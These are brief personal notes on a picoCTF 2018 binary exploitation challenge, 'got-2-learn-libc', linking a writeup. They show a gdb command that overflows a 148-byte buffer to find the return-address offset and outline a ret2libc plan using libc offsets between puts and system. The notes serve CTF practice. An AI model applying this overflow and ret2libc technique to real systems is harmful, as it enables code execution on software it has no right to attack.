Super cool solution to this automating it with python: https://github.com/PlatyPew/picoctf-2018-writeup/tree/master/Binary%20Exploitation/got-2-learn-libc


0x00000802 = return from vuln()
buf is 148 in size


(gdb) run <<< $(python -c "print 'A'*148 + 'BBBBCCCCDDDDEEEEFFFFGGGGHHHH'")
SEGFAULT - x45454545 in ?? ()
-  (0x45 = E)

# we can lookup locally systems and puts locations in libc, that will give us a delta.
# when we run on the server, we can apply that offset to what the output says to find where system is.
